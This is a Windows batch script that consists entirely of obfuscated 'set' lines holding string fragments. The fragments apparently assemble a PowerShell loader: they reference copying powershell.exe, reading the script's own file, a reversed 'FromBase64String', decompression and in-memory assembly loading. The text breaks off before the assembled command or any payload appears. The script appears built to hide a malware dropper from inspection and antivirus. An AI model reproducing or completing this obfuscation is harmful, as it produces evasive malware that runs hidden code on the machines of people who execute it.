@echo off
set "vkRCOGWZQK= /"
set "szSkxGYjQf=xe"
set "RQSscwsoSp=\v"
set "oYveCwITLo=rs"
set "SdFBpAyTXq=ll"
set "YilBDwhXFW=nd"
set "JUngLvPmks=Wi"
set "JAQNpvupRS=ws"
set "gSOcBoJNeV=\W"
set "NuhZGNRurL=0\"
set "QxVHmwopNw=rS"
set "mhojFcymRx=do"
set "svsYxaanUj=.e"
set "EHbvoReavI=ll"
set "JXdkpeLyPl=py"
set "XedcSlzNur=in"
set "OxakBkerUS= C"
set "wuQwpxTqqE=:\"
set "TUHjzWmAyS=1."
set "TiighDvSbN=co"
set "rHxcVjFYJq=y "
set "ToWfMikvGq=Po"
set "qWLtfFWeQw=st"
set "EWqhDXvvbs=we"
set "zdXjqphGVR=ow"
set "EYXgryCkEz=he"
set "hibWQZEEwz=we"
set "kvhkBUjTzg=s\"
set "QkWByXljwx=he"
set "YvsxFasEyc=po"
set "nirshCbbaJ=em"
set "nnyyCHWvoc=32"
set "uRgBUnioSS=Sy"
set "vKIgmguAZY=cd"
set "ZosvmTbAJk= %~dp0"
set "aUtbFDoGUc=ionM"
set "BTSRxJWkop=O.Me"
set "DbfJaVtYsF=Xq ="
set "OMqfrkRNiP=6] -"
set "btuRdGwkWh=[Env"
set "vfQvpTbpxh=Disp"
set "kofgtAdugi=('%~f0'"
set "vAqNsVnNej=yi ="
set "vazkNWfkeO=bjec"
set "KwxqwDoSFg=e = "
set "KwQyzGtYbl=6esa"
set "rNxizOqJJU=saBm"
set "hCZVzaNrJo=;$dB"
set "CxSxUDZYyn='dqR"
set "bQbDlpLqxH=.Key"
set "oCqURJLiig=Bmor"
set "yPZZqfSATM= = $"
set "uotsPIRrES=SsC "
set "FKpVLEnYaF=pDZz"
set "MKjCgLOfZi=);$B"
set "TDEzIcFawy=[-1."
set "RQUCtVZhWW=ress"
set "dgNauSGLmm=mory"
set "bbkEtIKEMw=tsWi"
set "cmacQgEXrZ=gnir"
set "hGtJhfVoBG=]::N"
set "pegYCwlsEO=..-1"
set "zvXtpphQfH=$BMU"
set "uGrdHYGUqj=okEQ"
set "BlEiEvoFiy=OyzA"
set "xFNZonHsSW= [st"
set "sdAnohJTUi=vert"
set "GZlawsNyGf== $B"
set "bceOhNudAJ=($eA"
set "HemTZSQTBa=okEQ"
set "kTMwnXUOSF=embl"
set "mkfxQCvgrn=pher"
set "YdfiUbAVnJ=DPi."
set "tXjvaiPNIB=ert]"
set "VjaQkajgaF=pres"
